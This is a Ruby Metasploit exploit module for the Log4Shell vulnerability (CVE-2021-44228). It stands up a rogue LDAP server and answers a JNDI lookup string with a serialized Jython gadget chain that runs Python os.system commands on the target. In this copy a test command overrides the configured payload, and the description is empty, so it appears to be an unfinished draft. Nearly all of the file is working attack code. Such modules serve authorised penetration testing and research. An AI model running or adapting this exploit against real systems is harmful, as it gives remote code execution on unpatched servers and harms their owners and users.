##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::LdapServer
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'JNDI LDAP',
        'Description' => %q{
        },
        'Author' => [
          'zhuowei', # GhidraLog4Shell
          'timwr', # metasploit module
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'References' => [
          ['CVE', '2021-44228'],
          ['URL', 'https://github.com/advisories/GHSA-jfh8-c2jp-5v3q'],
          ['URL', 'https://www.lunasec.io/docs/blog/log4j-zero-day/'],
          ['URL', 'https://github.com/zhuowei/GhidraLog4Shell'],
        ],
        'Targets' => [ [ 'Custom', {} ] ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-12-09'
      )
    )

    register_options([
      OptAddress.new('SRVHOST', [ true, 'The local host to listen on for the ldap server. This must be an address on the local machine or 0.0.0.0', '127.0.0.1' ]),
      OptPort.new('SRVPORT', [ true, 'The local port to listen on for the ldap server.', 1389 ]),
    ])
  end

  def make_stage2(python_code)
    placeholder = "\x74\x10\x18PYTHON_CODE_PLACEHOLDER_" + 'A' * 4096
    if python_code.length > 4096
      print_status('payload too long')
    end
    code = "\x74\x10\x18" + python_code + ' ' * (4096 + 24 - python_code.length)
    stage2 = exploit_data('CVE-2021-44228', 'jython_gadget').gsub(placeholder, code)
    stage2
  end

  def make_stage2_reply(command, message_id)
    java_class_name_attributes = seq([string('javaClassName'), set([string('java.io.PriorityQueue')])])
    java_serialized_data_attributes = seq([string('javaSerializedData'), set([string(make_stage2(command))])])
    attributes = seq([java_class_name_attributes, java_serialized_data_attributes])
    s = seq([
      int(message_id),
      aseq([string('cn=wtf, dc=example, dc=com'), attributes], SEARCH_RES_ENTRY)
    ])
    s.to_der
  end

  def read_ldap(socket)
    buffer = read_ldap_packet(socket)
    print_status("read_ldap buffer #{buffer.unpack('H*').first}")
    packet = OpenSSL::ASN1.decode(buffer)
    vprint_status("read_ldap #{packet.value}")
    tag = packet.value[1].tag
    vprint_status("read_ldap tag #{tag}")
    return [tag, packet]
  end

  def exploit
    ldap_port = datastore['SRVPORT']
    ldap_host = datastore['SRVHOST']
    ldap_url = 'abc'
    ldap = TCPServer.new(ldap_host, ldap_port)

    print_status("command: ${jndi:ldap://#{ldap_host}:#{ldap_port}/#{ldap_url}}")
    begin
      client = ldap.accept

      # this hardcodes an ldap conversation
      # read bindRequest 300c020101600702010304008000
      ldap_response = read_ldap(client)

      # write bindResponse
      client.write(['300c02010161070a010004000400'].pack('H*'))

      # read searchRequest
      ldap_response = read_ldap(client)

      if ldap_response[0] == SEARCH_REQUEST
        message_id = ldap_response[1].value[0].value.to_int

        # write searchResEntry
        # print_status("payload #{payload.raw}")
        # print_status("payload.encoded #{payload.encoded}")

        # eval_jython = 'eval(compile("' + payload.encoded + '", "", "exec")) or 0'
        # eval_jython = 'eval(compile("import os; os.system(\'touch /tmp/awnt\')", "", "exec")) or 0'
        python_code = payload.encoded
        os_cmd = 'touch /tmp/pwnlol'
        python_code = 'import os\nos.system(\'' + os_cmd + '\')'
        eval_jython = 'eval(compile("' + python_code + '", "", "exec")) or 0'
        client.write(make_stage2_reply(eval_jython, message_id))

        # write searchResDone
        client.write(search_res_done(message_id))

        ldap_response = read_ldap(client)
      else
        print_error('no LDAP SEARCH_REQUEST')
      end

      client.flush
    ensure
      client.close if client
      ldap.close
    end
  end
end
